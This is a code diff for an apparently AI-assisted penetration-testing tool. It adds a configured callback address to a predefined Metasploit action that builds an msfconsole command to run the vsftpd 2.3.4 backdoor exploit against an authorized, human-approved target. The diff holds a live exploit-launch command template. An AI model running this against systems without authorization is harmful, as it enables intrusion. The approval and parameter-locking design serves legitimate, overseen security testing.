@@ -10,6 +10,7 @@ from pentaia.approval import (
 )
 from pentaia.authorization import authorize_phase3_target
 from pentaia.kali_executor import run_command
+from pentaia.runtime_config import get_phase3_callback_address, validate_callback_ipv4
 
 logger = logging.getLogger(__name__)
 
@@ -19,6 +20,7 @@ class MetasploitOperation:
     action_id: str
     module: str
     timeout: int = 120
+    requires_callback_address: bool = False
 
 
 @dataclass(frozen=True)
@@ -40,13 +42,35 @@ PREDEFINED_METASPLOIT_OPERATIONS: dict[str, MetasploitOperation] = {
         action_id="validate_vsftpd_234_backdoor",
         module="exploit/unix/ftp/vsftpd_234_backdoor",
         timeout=120,
+        requires_callback_address=True,
     ),
 }
 
 
+def prepare_metasploit_parameters(
+    action_id: str,
+    model_parameters: dict[str, Any],
+) -> dict[str, Any]:
+    """Resolve runtime-owned material parameters before human approval.
+
+    Model-controlled values are copied first. Runtime-owned values required by the
+    code-owned operation are then resolved from PentAiA configuration and validated.
+    The returned dictionary is suitable for inclusion in the exact signed proposal.
+    """
+    operation = PREDEFINED_METASPLOIT_OPERATIONS.get(action_id)
+    if operation is None:
+        raise ValueError(f"Unsupported Phase 3 Metasploit action: {action_id}")
+
+    parameters = dict(model_parameters)
+    if operation.requires_callback_address:
+        parameters["lhost"] = get_phase3_callback_address()
+
+    return _validate_parameters(action_id, parameters)
+
+
 def _validate_parameters(action_id: str, parameters: dict[str, Any]) -> dict[str, Any]:
     if action_id == "validate_vsftpd_234_backdoor":
-        unexpected = set(parameters) - {"rport"}
+        unexpected = set(parameters) - {"rport", "lhost"}
         if unexpected:
             raise ValueError(
                 "Unsupported parameters for validate_vsftpd_234_backdoor: "
@@ -59,7 +83,8 @@ def _validate_parameters(action_id: str, parameters: dict[str, Any]) -> dict[str
         if not 1 <= rport <= 65535:
             raise ValueError("Metasploit rport must be between 1 and 65535.")
 
-        return {"rport": rport}
+        lhost = validate_callback_ipv4(parameters.get("lhost"))
+        return {"rport": rport, "lhost": lhost}
 
     raise ValueError(f"Unsupported Phase 3 Metasploit action: {action_id}")
 
@@ -72,15 +97,17 @@ def _build_command(
     rport = parameters["rport"]
 
     # Every token in this resource script comes from code-owned constants or
-    # already validated typed values. No arbitrary Metasploit commands are accepted.
+    # already validated typed/runtime-owned values. No arbitrary commands are accepted.
     resource_script = (
         f"use {operation.module}; "
         f"set RHOSTS {target}; "
         f"set RPORT {rport}; "
-        "run; "
-        "exit -y"
     )
 
+    if operation.requires_callback_address:
+        resource_script += f"set LHOST {parameters['lhost']}; "
+
+    resource_script += "run; exit -y"
     return f"msfconsole -q -x {shlex.quote(resource_script)}"
 
 
@@ -90,9 +117,10 @@ def run_metasploit_action(
 ) -> MetasploitExecutionResult:
     """Execute one predefined, authorized, explicitly approved Phase 3 action.
 
-    The wrapper accepts no shell command, Metasploit module, payload, or free-form
-    console text from the model. The action ID selects a code-owned operation and
-    only action-specific typed parameters are accepted.
+    The wrapper accepts no shell command, module, payload, callback address, or
+    free-form console text from the model. The action ID selects a code-owned
+    operation and all material parameters must already be present in the exact
+    human-approved proposal.
     """
     operation = PREDEFINED_METASPLOIT_OPERATIONS.get(proposal.action_id)
     if operation is None:
@@ -109,7 +137,7 @@ def run_metasploit_action(
     command = _build_command(operation, target, parameters)
 
     logger.info(
-        "Executing approved Phase 3 Metasploit action action_id=%s target=%s module=%s",
+        "Executing approved Phase 3 action action_id=%s target=%s module=%s",
         operation.action_id,
         target,
         operation.module,
@@ -121,7 +149,7 @@ def run_metasploit_action(
     )
 
     logger.info(
-        "Phase 3 Metasploit action completed action_id=%s target=%s exit_code=%s",
+        "Phase 3 action completed action_id=%s target=%s exit_code=%s",
         operation.action_id,
         target,
         exit_code,
